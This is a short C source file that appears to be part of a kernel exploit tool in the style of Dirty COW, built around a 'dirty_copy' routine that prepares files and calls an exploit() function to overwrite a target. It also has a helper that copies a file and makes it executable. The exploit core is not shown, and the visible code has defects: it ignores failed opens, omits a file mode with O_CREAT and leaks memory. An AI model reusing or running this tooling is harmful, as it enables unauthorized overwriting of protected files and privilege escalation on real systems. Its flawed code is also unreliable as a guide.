#include <err.h>
#include <stdio.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <malloc.h>

#include "dirty_copy.h"

int copy_file(const char* src_path, const char* dst_path)
{
  int src_fd = open(src_path, O_RDONLY);
  if (src_fd == -1)
  {
    LOGV("unable to open %s: %s", src_path, strerror(errno));
  }
  int dst_fd = open(dst_path, O_WRONLY | O_CREAT);
  if (dst_fd == -1)
  {
    LOGV("unable to open %s: %s", dst_path, strerror(errno));
  }

  size_t bufsize = 4096;
  void* buf = (void*)malloc(bufsize);
  int readed = 0;
  do {
    readed = read(src_fd, buf, bufsize);
    if (readed > 0)
    {
      int written = write (dst_fd, buf, readed);
      LOGV("written %d", written);
      if (written == -1)
      {
        LOGV("unable to write: %s", strerror(errno));
        return -1;
      }
    }

    LOGV("%d readed", readed);
  } while(readed > 0);

  chmod(dst_path, 0755);

  close(src_fd);
  close(dst_fd);
  return 0;
}

int dirty_copy(const char *src_path, const char *dst_path) {
  struct mem_arg mem_arg;
  if (prepare_dirty_copy(src_path, dst_path, &mem_arg) == -1)
  {
    LOGV("Unable to prepare files!");
    return -1;
  }

  exploit(&mem_arg);

  if (mem_arg.success == 0) {
    return -1;
  }

  return 0;
}
